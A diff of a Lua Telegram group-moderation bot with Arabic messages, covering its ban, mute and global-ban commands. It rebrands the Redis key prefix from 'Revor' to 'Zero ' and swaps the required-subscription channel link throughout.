@@ -4543,7 +4546,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserInfo = LuaTele.getUser(UserId[3])
@@ -4574,13 +4577,13 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ البوت ليس ادمن في المجموعه يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4606,7 +4609,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4635,7 +4638,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4644,7 +4647,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -4668,7 +4671,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4682,10 +4685,10 @@ end
 if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:BanAll:Groups",Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :BanAll:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:BanAll:Groups",Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :BanAll:Groups",Message_Reply.sender.user_id) 
 LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم حظره عام من المجموعات ").Reply,"md",true)  
 end
@@ -4695,7 +4698,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4706,10 +4709,10 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:BanAll:Groups",Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :BanAll:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:BanAll:Groups",Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :BanAll:Groups",Message_Reply.sender.user_id) 
 LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
 end
@@ -4719,7 +4722,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4733,10 +4736,10 @@ end
 if Controller(msg_chat_id,Message_Reply.sender.user_id) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:ktmAll:Groups",Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :ktmAll:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:ktmAll:Groups",Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :ktmAll:Groups",Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم كتمه عام من المجموعات ").Reply,"md",true)  
 end
 end
@@ -4745,7 +4748,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4756,10 +4759,10 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:ktmAll:Groups",Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :ktmAll:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:ktmAll:Groups",Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :ktmAll:Groups",Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
 end
 end
@@ -4768,7 +4771,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4777,7 +4780,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4791,10 +4794,10 @@ end
 if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم حظره من المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'banned',0)
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم حظره من المجموعه ").Reply,"md",true)  
 end
@@ -4804,7 +4807,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4818,10 +4821,10 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء حظره من المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :BanGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء حظره من المجموعه  ").Reply,"md",true)  
 end
@@ -4832,7 +4835,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if GetInfoBot(msg).Delmsg == false then
@@ -4849,10 +4852,10 @@ end
 if StatusSilent(msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم كتمه في المجموعه مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم كتمه في المجموعه  ").Reply,"md",true)  
 end
 end
@@ -4861,7 +4864,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4872,10 +4875,10 @@ end
 if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء كتمه من المجموعه ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :SilentGroup:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم الغاء كتمه من المجموعه ").Reply,"md",true)  
 end
 end
@@ -4885,7 +4888,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4894,7 +4897,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4917,7 +4920,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4943,7 +4946,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -4952,7 +4955,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -4976,7 +4979,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserInfo = LuaTele.getUser(UserId)
@@ -4986,10 +4989,10 @@ end
 if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:BanAll:Groups",UserId) then
+if Redis:sismember(Zero .."Zero :BanAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:BanAll:Groups",UserId) 
+Redis:sadd(Zero .."Zero :BanAll:Groups",UserId) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم حظره عام من المجموعات ").Reply,"md",true)  
 end
@@ -5000,17 +5003,17 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserInfo = LuaTele.getUser(UserId)
 if UserInfo.luatele == "error" and UserInfo.code == 6 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:BanAll:Groups",UserId) then
+if not Redis:sismember(Zero .."Zero :BanAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:BanAll:Groups",UserId) 
+Redis:srem(Zero .."Zero :BanAll:Groups",UserId) 
 LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
 end
@@ -5021,7 +5024,7 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserInfo = LuaTele.getUser(UserId)
@@ -5031,10 +5034,10 @@ end
 if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
 end
-if Redis:sismember(Revor.."Revor:ktmAll:Groups",UserId) then
+if Redis:sismember(Zero .."Zero :ktmAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:ktmAll:Groups",UserId) 
+Redis:sadd(Zero .."Zero :ktmAll:Groups",UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم كتمه عام من المجموعات ").Reply,"md",true)  
 end
 end
@@ -5044,17 +5047,17 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserInfo = LuaTele.getUser(UserId)
 if UserInfo.luatele == "error" and UserInfo.code == 6 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
 end
-if not Redis:sismember(Revor.."Revor:ktmAll:Groups",UserId) then
+if not Redis:sismember(Zero .."Zero :ktmAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:ktmAll:Groups",UserId) 
+Redis:srem(Zero .."Zero :ktmAll:Groups",UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
 end
 end
@@ -5064,7 +5067,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -5073,7 +5076,7 @@ end
 if GetInfoBot(msg).BanUser == false then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:BanId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:BanId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
 end 
 local UserInfo = LuaTele.getUser(UserId)
